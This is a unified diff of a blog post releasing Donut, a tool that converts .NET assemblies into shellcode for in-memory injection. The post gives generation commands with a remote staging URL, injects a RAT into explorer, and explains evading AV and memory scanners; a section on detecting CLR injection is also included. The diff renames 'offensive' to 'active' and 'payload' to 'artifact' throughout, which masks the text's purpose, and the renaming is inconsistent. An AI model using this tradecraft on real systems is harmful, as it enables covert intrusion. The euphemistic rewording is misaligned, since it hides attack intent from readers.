@@ -7,7 +7,7 @@ title: Donut - Injecting .NET Assemblies as Shellcode
 
 # Advancing Tradecraft - Context
 
-Offensive and red team tradecraft have changed significantly in the past year. As anti-malware systems improve their capability to detect and deter offensive tools, attackers are shifting their focus to technologies that are not observed by AV. Currently, that means operating entirely in memory and avoiding dropping files onto disk. In the Windows world, the .NET Framework provides a convenient mechanism for this. It is, however, severely restricted in that .NET programs cannot be injected directly into remote processes. In this article, we will address this issue by describing how to inject .NET code into processes via shellcode.
+Active and red team tradecraft have changed significantly in the past year. As anti-malware systems improve their capability to detect and deter active tools, attackers are shifting their focus to technologies that are not observed by AV. Currently, that means operating entirely in memory and avoiding dropping files onto disk. In the Windows world, the .NET Framework provides a convenient mechanism for this. It is, however, severely restricted in that .NET programs cannot be injected directly into remote processes. In this article, we will address this issue by describing how to inject .NET code into processes via shellcode.
 
 ## .NET Primer
 
@@ -41,7 +41,7 @@ The main problem with execute-assembly is that it executes the same way every ti
 
 1. A subprocess is created using the *spawnto* executable. Mudge refers to this as a "sacrificial process" because it acts as a host for your payloads, isolating your Beacon's process from any failure in your code.
 2. A reflective DLL is injected into the subprocess to load the .NET Runtime.
-3. The reflective DLL loads an intermediate .NET Assembly to handle errors and improve the stability of your payload.
+3. The reflective DLL loads an intermediate .NET Assembly to handle errors and improve the stability of your artifact.
 4. The intermediate .NET Assembly loads your .NET Assembly from memory inside the subprocess.
 5. The main entry point of your Assembly is invoked along with your command-line arguments.
 
@@ -57,7 +57,7 @@ To move past these limitations, we need a technique that meets the following req
 * Allows you to determine in what way that injection occurs.
 * Works with multiple types of process injection.
 
-The most flexible type of payload that meets those requirements is shellcode. But you can't just convert a .NET Assembly to shellcode. They run through a runtime environment, not directly on the hardware. Wouldn't it be great if we could just inject .NET Assemblies as shellcode? Yes. Yes, it would.
+The most flexible type of artifact that meets those requirements is shellcode. But you can't just convert a .NET Assembly to shellcode. They run through a runtime environment, not directly on the hardware. Wouldn't it be great if we could just inject .NET Assemblies as shellcode? Yes. Yes, it would.
 
 # Introducing Donut
 
@@ -75,23 +75,23 @@ Donut is currently at version 0.9 (Beta). Please share any issues or suggestions
 
 Microsoft provides an API known as the [Unmanaged CLR Hosting API](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/). This API allows for unmanaged code (such as C or C++) to host, inspect, configure, and use Common Language Runtimes. It is a legitimate API that can be used for many purposes. Microsoft uses it for several of their products, and other companies use it to design custom loaders for their programs. It can be used to improve performance of .NET applications, create sandboxes, or just do wierd stuff. We do the latter.
 
-One of the things it can do is manually load .NET Assemblies into arbitrary [Application Domains](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains). It can do this either from disk or from memory. We utilize its capability for loading from memory to load your payload without touching disk.
+One of the things it can do is manually load .NET Assemblies into arbitrary [Application Domains](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains). It can do this either from disk or from memory. We utilize its capability for loading from memory to load your artifact without touching disk.
 
 To see a standalone example of an Unmanaged CLR Hosting Assembly loader, check out Casey Smith's repo: [AssemblyLoader](https://github.com/caseysmithrc/AssemblyLoader)
 
 ## CLR Injection
 
-The first action that donut's shellcode takes is to load the CLR. Unless the user specifies the exact runtime version to use, v4.0.30319 of the CLR will be used by default, which supports the versions 4.0+ of .NET. If the attempt to load a specific version fails, then donut will attempt to use whichever one is avialable on the system. Once the CLR is loaded, the shellcode creates a new Application Domain. At this point, the .NET Assembly payload must be obtained. If the user provided a staging URL, then the Assembly is downloaded from it. Otherwise, it is obtained from memory. Either way, it will loaded into the new AppDomain. After the Assembly is loaded but before it is run, the decrypted copy will be released and later freed from memory with VirtualFree to deter memory scanners. Finally, the Entry Point specified by the user will be invoked along with any provided parameters.
+The first action that donut's shellcode takes is to load the CLR. Unless the user specifies the exact runtime version to use, v4.0.30319 of the CLR will be used by default, which supports the versions 4.0+ of .NET. If the attempt to load a specific version fails, then donut will attempt to use whichever one is avialable on the system. Once the CLR is loaded, the shellcode creates a new Application Domain. At this point, the .NET Assembly artifact must be obtained. If the user provided a staging URL, then the Assembly is downloaded from it. Otherwise, it is obtained from memory. Either way, it will loaded into the new AppDomain. After the Assembly is loaded but before it is run, the decrypted copy will be released and later freed from memory with VirtualFree to deter memory scanners. Finally, the Entry Point specified by the user will be invoked along with any provided parameters.
 
-If the CLR is already loaded into the host process, then donut's shellcode will still work. The .NET Assembly will just be loaded into a new Application Domain within the managed process. .NET is designed to allow for .NET Assemblies built for multiple versions of .NET to run simultaneously in the same process. As such, your payload should always run no matter the process's state before injection.
+If the CLR is already loaded into the host process, then donut's shellcode will still work. The .NET Assembly will just be loaded into a new Application Domain within the managed process. .NET is designed to allow for .NET Assemblies built for multiple versions of .NET to run simultaneously in the same process. As such, your artifact should always run no matter the process's state before injection.
 
 ## Shellcode Generation
 
-The logic above describes how the shellcode generated by donut works. That logic is defined in payload.exe. To get the shellcode, exe2h extracts the compiled machine code from the .text segment in payload.exe and saves it as a C array to a C header file. donut combines the shellcode with a Donut Instance (a configuration for the shellcode) and a Donut Module (a structure containing the .NET assembly, class name, method name and any parameters).
+The logic above describes how the shellcode generated by donut works. That logic is defined in artifact.exe. To get the shellcode, exe2h extracts the compiled machine code from the .text segment in artifact.exe and saves it as a C array to a C header file. donut combines the shellcode with a Donut Instance (a configuration for the shellcode) and a Donut Module (a structure containing the .NET assembly, class name, method name and any parameters).
 
 # Using Donut
 
-Donut can be used as-is to generate shellcode from arbitrary .NET Assemblies. Both a Windows EXE and a Python (Python planned for v1.0) script are provided for payload generation. The command-line syntax is as described below.
+Donut can be used as-is to generate shellcode from arbitrary .NET Assemblies. Both a Windows EXE and a Python (Python planned for v1.0) script are provided for artifact generation. The command-line syntax is as described below.
 
 ```
  usage: donut [options] -f <.NET assembly> -c <namespace.class> -m <Method>
@@ -137,13 +137,13 @@ When generating shellcode to run an an older Windows machine, you may need it to
 .\donut.exe -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
 ```
 
-The name of the AppDomain for your .NET payload may be specified manually using the '-d' option. By default, it will be randomly generated. You may specify a name.
+The name of the AppDomain for your .NET artifact may be specified manually using the '-d' option. By default, it will be randomly generated. You may specify a name.
 
 ```
 .\donut.exe -d ResourceDomain -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
 ```
 
-In order to reduce the size of your shellcode (or for many other reasons), you may specify a URL where your payload will be hosted. Donut will produce an encrypted Donut Module with a random name that you should place at the URI you specified. The name and location where you should place it will be printed to your screen when you generate the shellcode.
+In order to reduce the size of your shellcode (or for many other reasons), you may specify a URL where your artifact will be hosted. Donut will produce an encrypted Donut Module with a random name that you should place at the URI you specified. The name and location where you should place it will be printed to your screen when you generate the shellcode.
 
 ```
 .\donut.exe -u http://remote_server.com/modules/ -d ResourceDomain -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
@@ -151,7 +151,7 @@ In order to reduce the size of your shellcode (or for many other reasons), you m
 
 ## Demonstrating with SILENTTRINITY
 
-For a demonstration, we will use the [SILENTTRINITY RAT](https://github.com/byt3bl33d3r/SILENTTRINITY "SILENTTRINITY") as a test payload. Since it is the most... ahh... complicated .NET Assembly that I could find, I used it for all of my testing. You may use any standard shellcode injection technique to inject the .NET Assembly. The DonutTest subproject is provided in the repo as an example injector. You may combine it with the DemoCreateProcess subproject to test the shellcode generator. In our case, we will first use DonutTest to inject into explorer. We also show what it looks like to use an existing implant to perform further injection using the ``` boo/shellcode ``` and ``` ipy/execute-assembly ``` post-exploitation modules.
+For a demonstration, we will use the [SILENTTRINITY RAT](https://github.com/byt3bl33d3r/SILENTTRINITY "SILENTTRINITY") as a test artifact. Since it is the most... ahh... complicated .NET Assembly that I could find, I used it for all of my testing. You may use any standard shellcode injection technique to inject the .NET Assembly. The DonutTest subproject is provided in the repo as an example injector. You may combine it with the DemoCreateProcess subproject to test the shellcode generator. In our case, we will first use DonutTest to inject into explorer. We also show what it looks like to use an existing implant to perform further injection using the ``` boo/shellcode ``` and ``` ipy/execute-assembly ``` post-exploitation modules.
 
 ### Generation
 
@@ -194,20 +194,20 @@ donut is provided as both dynamic and static libraries for both (*.a* / *.so*) a
 
 ## Rebuilding the shellcode
 
-You may easily customize our shellcode to fit your use case. *payload.c* contains the .NET assembly loader, which should successfully compile with both Microsoft Visual Studio and mingw-w64. Make files have been provided for both compilers which will generate x86-64 shellcode by default unless x86 is supplied as a label to nmake/make. Whenever *payload.c* has been changed, recompiling for all architectures is recommended before rebuilding donut.
+You may easily customize our shellcode to fit your use case. *artifact.c* contains the .NET assembly loader, which should successfully compile with both Microsoft Visual Studio and mingw-w64. Make files have been provided for both compilers which will generate x86-64 shellcode by default unless x86 is supplied as a label to nmake/make. Whenever *artifact.c* has been changed, recompiling for all architectures is recommended before rebuilding donut.
 
 ### Microsoft Visual Studio
 
-Open the x64 Microsoft Visual Studio build environment, switch to the *payload* directory, and type the following:
+Open the x64 Microsoft Visual Studio build environment, switch to the *artifact* directory, and type the following:
 
 ```
 nmake clean -f Makefile.msvc
 nmake -f Makefile.msvc
 ```
 
-This should generate a 64-bit executable (*payload.exe*) from *payload.c*. exe2h will then extract the shellcode from the *.text* segment of the PE file and save it as a C array to *payload_exe_x64.h*. When donut is rebuilt, this new shellcode will be used for all payloads that it generates.
+This should generate a 64-bit executable (*artifact.exe*) from *artifact.c*. exe2h will then extract the shellcode from the *.text* segment of the PE file and save it as a C array to *payload_exe_x64.h*. When donut is rebuilt, this new shellcode will be used for all payloads that it generates.
 
-To generate 32-bit shellcode, open the x86 Microsoft Visual Studio build environment, switch to the payload directory, and type the following:
+To generate 32-bit shellcode, open the x86 Microsoft Visual Studio build environment, switch to the artifact directory, and type the following:
 
 ```
 nmake clean -f Makefile.msvc
@@ -218,7 +218,7 @@ This will save the shellcode as a C array to *payload_exe_x86.h*.
 
 ### Mingw-w64
 
-Assuming you're on Linux and *mingw-w64* has been installed from packages or source, you may still rebuild the shellcode using our provided makefile. Change to the *payload* directory and type the following:
+Assuming you're on Linux and *mingw-w64* has been installed from packages or source, you may still rebuild the shellcode using our provided makefile. Change to the *artifact* directory and type the following:
 
 ```
 make clean -f Makefile.mingw
@@ -239,7 +239,7 @@ We hope that donut (or something inspired by it) will be integrated into tooling
 
 # Advancing Tradecraft
 
-It is our hope that releasing donut to the public will advance offensive and red team tradecraft in several ways:
+It is our hope that releasing donut to the public will advance active and red team tradecraft in several ways:
 
 * Provide red teams and adversary emulators with a means to emulate this technique that threat actors may have developed in secret.
 * Provide blue teams a frame of refernce for detecting and mitigating CLR Injection techniques.
@@ -247,7 +247,7 @@ It is our hope that releasing donut to the public will advance offensive and red
 
 ## Alternative Payloads
 
-The main benefit of using .NET Assemblies as shellcode is that they can now be executed by anything that can execute shellcode on Windows. There are many more ways to inject shellcode than there are to load Assemblies. As such, offensive tool designers no longer need to design their payloads around running .NET. Instead, they may leverage their existing payloads and techniques that use shellcode.
+The main benefit of using .NET Assemblies as shellcode is that they can now be executed by anything that can execute shellcode on Windows. There are many more ways to inject shellcode than there are to load Assemblies. As such, active tool designers no longer need to design their payloads around running .NET. Instead, they may leverage their existing payloads and techniques that use shellcode.
 
 ## Injecting .NET At Will / Migration
 
@@ -255,7 +255,7 @@ Donut will also allow the developers of C2 Frameworks / RATs to add migrate-like
 
 ## Disposable AppDomains
 
-When donut loads an Assembly, it loads it into a new AppDomain. Unless the user specifies the name of the AppDomain with the '-d' parameter, the AppDomain is given a random name. We specifically designed donut to run payloads in new AppDomains rather than using DefaultDomain. If this does not suit you, you can easily modify payload.c to use the default domain. By running the payload in its own AppDomain, this allows for the development of tools that run post-exploitation modules in disposable AppDomains. Application Domains can be unloaded, but individual Assemblies cannot. Therefore, to unload an Assembly when you are done with it, you must put it into its own AppDomain and unload that instead. A C# agent can have the shellcode generated on its server, inject the result into itself in a new thread, wait for the Assembly to finish executing, then unload the host AppDomain. You could also modify the shellcode itself to perform that role.
+When donut loads an Assembly, it loads it into a new AppDomain. Unless the user specifies the name of the AppDomain with the '-d' parameter, the AppDomain is given a random name. We specifically designed donut to run payloads in new AppDomains rather than using DefaultDomain. If this does not suit you, you can easily modify artifact.c to use the default domain. By running the artifact in its own AppDomain, this allows for the development of tools that run post-exploitation modules in disposable AppDomains. Application Domains can be unloaded, but individual Assemblies cannot. Therefore, to unload an Assembly when you are done with it, you must put it into its own AppDomain and unload that instead. A C# agent can have the shellcode generated on its server, inject the result into itself in a new thread, wait for the Assembly to finish executing, then unload the host AppDomain. You could also modify the shellcode itself to perform that role.
 
 ## Detecting CLR Injection
 
@@ -333,4 +333,4 @@ However, as I mentioned, this analytic fails to detect CLR Injection into proces
 
 # Conclusion
 
-Offensive .NET tradecraft is faced with several important challenges. One of them is the lack of means to inject into remote processes at will. While this can normally be performed with shellcode, there is no way to produce shellcode that can run a .NET Assembly directly on hardware. Any shellcode that runs a .NET Assembly must first bootstrap the Common Language Runtime and load the Assembly through it. Enter Donut. With Donut, we now have a framework for generating flexible shellcode that loads a .NET Assembly from memory. This can be combined with existing techniques and tooling to advance tradecraft in a number of ways. Hopefully, this will break down the current barriers in .NET-based exploitation and provide tool designers with a foundation for crafting more excellent tools.
+Active .NET tradecraft is faced with several important challenges. One of them is the lack of means to inject into remote processes at will. While this can normally be performed with shellcode, there is no way to produce shellcode that can run a .NET Assembly directly on hardware. Any shellcode that runs a .NET Assembly must first bootstrap the Common Language Runtime and load the Assembly through it. Enter Donut. With Donut, we now have a framework for generating flexible shellcode that loads a .NET Assembly from memory. This can be combined with existing techniques and tooling to advance tradecraft in a number of ways. Hopefully, this will break down the current barriers in .NET-based exploitation and provide tool designers with a foundation for crafting more excellent tools.
